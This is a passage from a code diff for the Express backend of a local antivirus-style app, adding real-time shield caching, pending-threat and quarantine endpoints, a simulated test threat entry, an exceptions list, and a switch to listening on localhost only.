                     scannedFiles, 
                     duration,
                     actionTaken: isThreat ? "Quarantined" : "None"
                 });
+
+                if ((type === "disk" || type === "folder" || type === "file") && effectiveTarget) {
+                    appendJobLogs(jobId, ["Building real-time shield cache for this scan target..."]);
+                    try {
+                        const cachedCount = await addTargetToShieldCache(shieldScanCache, effectiveTarget, (count) => {
+                            appendJobLogs(jobId, [`Shield cache indexed: ${count} files`]);
+                        });
+                        await saveShieldScanCache(shieldScanCache);
+                        appendJobLogs(jobId, [`Shield cache updated: ${cachedCount} files indexed`]);
+                    } catch (e: any) {
+                        appendJobLogs(jobId, [`Shield cache update failed: ${e.message}`]);
+                    }
+                }
+
+                activeJobs[jobId].status = "done";
+                activeJobs[jobId].result = code ?? 0;
+                activeJobs[jobId].process = null;
             });
 
             child.on("error", (err) => {
                 if (!activeJobs[jobId]) return;
-                activeJobs[jobId].logs.push(`Error: ${err.message}`);
+                appendJobLogs(jobId, [`Error: ${err.message}`]);
                 activeJobs[jobId].status = "done";
                 activeJobs[jobId].result = -1;
                 activeJobs[jobId].process = null;
@@ -1043,6 +1487,90 @@ if ($dialog.ShowDialog() -eq 'OK') {
         }
     });
 
+    app.get("/api/pending-threats", (req, res) => {
+        res.json(pendingThreats);
+    });
+
+    app.post("/api/simulate-threat", (req, res) => {
+        pendingThreats.push({
+            id: Date.now().toString() + Math.random().toString(36).substring(7),
+            originalPath: "C:\\TestPath\\fake-virus.exe",
+            threatName: "Win32.Test.SimulatedThreat.A",
+            timestamp: Date.now()
+        });
+        res.json({ success: true });
+    });
+
+    app.post("/api/pending-threats/:id/action", async (req, res) => {
+        const threatId = req.params.id;
+        const action = req.body.action; // "quarantine" | "ignore"
+        const index = pendingThreats.findIndex(t => t.id === threatId);
+        
+        if (index === -1) {
+            return res.json({ success: false, error: "Threat not found" });
+        }
+        
+        const threat = pendingThreats[index];
+        pendingThreats.splice(index, 1);
+        
+        if (action === "quarantine") {
+            try {
+                const quarantined = await quarantineFile(threat.originalPath, threat.threatName, settings.quarantineDir);
+                const qMap = await getQuarantineMap();
+                qMap[quarantined.fileName] = quarantined.metadata;
+                await saveQuarantineMap(qMap);
+            } catch (e: any) {
+                console.error("Failed to quarantine from pending:", e.message);
+            }
+        } else if (action === "exception") {
+            const exceptions = await getExceptions();
+            if (!exceptions.includes(threat.originalPath)) {
+                exceptions.push(threat.originalPath);
+                await saveExceptions(exceptions);
+            }
+        }
+        res.json({ success: true });
+    });
+
+    app.post("/api/empty-quarantine", async (req, res) => {
+        try {
+            const files = await fs.readdir(settings.quarantineDir);
+            for (const file of files) {
+                try {
+                    await fs.unlink(path.join(settings.quarantineDir, file));
+                } catch (e) {
+                    console.error("Cannot delete quarantine file:", file);
+                }
+            }
+            await saveQuarantineMap({});
+            res.json({ success: true });
+        } catch (e: any) {
+            res.status(500).json({ error: e.message });
+        }
+    });
+
+    app.get("/api/exceptions", async (req, res) => {
+        try {
+            res.json(await getExceptions());
+        } catch (e: any) {
+            res.status(500).json({ error: e.message });
+        }
+    });
+
+    app.post("/api/exceptions", async (req, res) => {
+        try {
+            const list = req.body.exceptions;
+            if (Array.isArray(list)) {
+                await saveExceptions(list);
+                res.json({ success: true });
+            } else {
+                res.status(400).json({ error: "Invalid array" });
+            }
+        } catch (e: any) {
+            res.status(500).json({ error: e.message });
+        }
+    });
+
     app.get("/api/quarantine", async (req, res) => {
         try {
             const files = await fs.readdir(settings.quarantineDir);
@@ -1097,22 +1625,36 @@ if ($dialog.ShowDialog() -eq 'OK') {
         }
     });
 
+    app.get('/alert.html', (req, res) => {
+        const isProd = process.env.NODE_ENV === "production";
+        const alertPath = isProd 
+            ? path.join(runtimeDir, "..", "public", "alert.html") 
+            : path.join(runtimeDir, "public", "alert.html");
+            
+        if (existsSync(alertPath)) {
+            res.sendFile(alertPath);
+        } else {
+            res.status(404).send("Alert not found");
+        }
+    });
+
     // Vite Middleware for Frontend
     if (process.env.NODE_ENV !== "production") {
+        const { createServer: createViteServer } = await import("vite");
         const vite = await createViteServer({
             server: { middlewareMode: true },
             appType: "spa"
         });
         app.use(vite.middlewares);
     } else {
-        const distPath = path.join(process.cwd(), "dist");
+        const distPath = path.join(runtimeDir);
         app.use(express.static(distPath));
         app.get("*", (req, res) => res.sendFile(path.join(distPath, "index.html")));
     }
 
     const PORT = process.env.PORT || 3000;
-    app.listen(Number(PORT), "0.0.0.0", () => {
-        console.log(`Server running on http://0.0.0.0:${PORT} (Simulated: ${isSimulated})`);
+    app.listen(Number(PORT), "127.0.0.1", () => {
+        console.log(`Server running on http://127.0.0.1:${PORT} (Simulated: ${isSimulated})`);
     });
 }
 
